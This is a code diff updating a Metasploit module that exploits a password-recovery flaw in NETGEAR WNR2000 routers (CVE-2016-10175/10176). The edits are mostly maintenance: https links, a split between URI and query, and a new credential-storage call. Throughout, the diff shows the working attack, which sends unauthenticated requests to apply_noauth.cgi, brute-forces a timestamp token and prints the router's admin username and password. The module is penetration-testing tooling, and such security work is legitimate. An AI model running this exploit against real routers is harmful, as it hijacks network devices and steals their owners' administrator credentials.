@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'time'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::CRand
 
@@ -18,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
         The NETGEAR WNR2000 router has a vulnerability in the way it handles password recovery.
         This vulnerability can be exploited by an unauthenticated attacker who is able to guess
         the value of a certain timestamp which is in the configuration of the router.
-        Bruteforcing the timestamp token might take a few minutes, a few hours, or days, but
+        Brute forcing the timestamp token might take a few minutes, a few hours, or days, but
         it is guaranteed that it can be bruteforced.
         This module works very reliably and it has been tested with the WNR2000v5, firmware versions
         1.0.0.34 and 1.0.0.18. It should also work with the hardware revisions v4 and v3, but this
@@ -34,19 +32,19 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2016-10175'],
           ['CVE', '2016-10176'],
           ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt'],
-          ['URL', 'http://seclists.org/fulldisclosure/2016/Dec/72'],
+          ['URL', 'https://seclists.org/fulldisclosure/2016/Dec/72'],
           ['URL', 'http://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability']
         ],
       'DisclosureDate'  => 'Dec 20 2016'))
     register_options(
       [
         Opt::RPORT(80)
-      ], self.class)
+      ])
     register_advanced_options(
       [
         OptInt.new('TIME_OFFSET', [true, 'Maximum time differential to try', 5000]),
         OptInt.new('TIME_SURPLUS', [true, 'Increase this if you are sure the device is vulnerable and you are not getting through', 200])
-      ], self.class)
+      ])
   end
 
   def get_current_time
@@ -99,7 +97,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # 1: send serial number
     send_request_cgi({
-      'uri'     => '/apply_noauth.cgi?/unauth.cgi',
+      'uri'     => '/apply_noauth.cgi',
+      'query'   => '/unauth.cgi',
       'method'  => 'POST',
       'Content-Type' => 'application/x-www-form-urlencoded',
       'vars_post' =>
@@ -112,7 +111,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # 2: send answer to secret questions
     send_request_cgi({
-      'uri'     => '/apply_noauth.cgi?/securityquestions.cgi',
+      'uri'     => '/apply_noauth.cgi',
+      'query'   => '/securityquestions.cgi',
       'method'  => 'POST',
       'Content-Type' => 'application/x-www-form-urlencoded',
       'vars_post' =>
@@ -148,40 +148,14 @@ class MetasploitModule < Msf::Auxiliary
     return [username, password]
   end
 
-  def report_cred(opts)
-    service_data = {
-      address: opts[:ip],
-      port: opts[:port],
-      service_name: 'netgear',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-      origin_type: :service,
-      module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :password
-    }.merge(service_data)
-
-    login_data = {
-      last_attempted_at: DateTime.now,
-      core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::SUCCESSFUL,
-      proof: opts[:proof]
-    }.merge(service_data)
-
-    create_credential_login(login_data)
-  end
-
   def send_req(timestamp)
     begin
-      uri_str = (timestamp == nil ? \
-        "/apply_noauth.cgi?/PWD_password.htm" : \
-        "/apply_noauth.cgi?/PWD_password.htm%20timestamp=#{timestamp.to_s}")
+      query_str = (timestamp == nil ? \
+        '/PWD_password.htm' : \
+        "/PWD_password.htm%20timestamp=#{timestamp.to_s}")
       res = send_request_raw({
-          'uri'     => uri_str,
+          'uri'     => '/apply_noauth.cgi',
+          'query'   => query_str,
           'method'  => 'POST',
           'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
           'data'    => "submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=#{@q1}&question2=2&answer2=#{@q2}"
@@ -207,7 +181,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # no result? let's just go on and bruteforce the timestamp
-    print_bad("#{peer} - Well that didn't work... let's do it the hard way.")
+    print_error("#{peer} - Well that didn't work... let's do it the hard way.")
 
     # get the current date from the router and parse it
     end_time = get_current_time
@@ -240,7 +214,7 @@ class MetasploitModule < Msf::Auxiliary
         if res && res.code == 200
           credentials = get_creds
           print_good("#{peer} - Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
-          report_cred({ 'user' => credentials[0], 'password' => credentials[1] })
+          store_valid_credential(user: credentials[0], private: credentials[1]) # more consistent service_name and protocol, now supplies ip and port
           return
         end
       end
@@ -248,7 +222,7 @@ class MetasploitModule < Msf::Auxiliary
       start_time -= datastore['TIME_OFFSET']
       if start_time < 0
         if end_time <= datastore['TIME_OFFSET']
-          fail_with(Failure::Unknown, "#{peer} - Exploit failed.")
+          fail_with(Failure::Unknown, "#{peer} - Exploit failed")
         end
         start_time = 0
       end
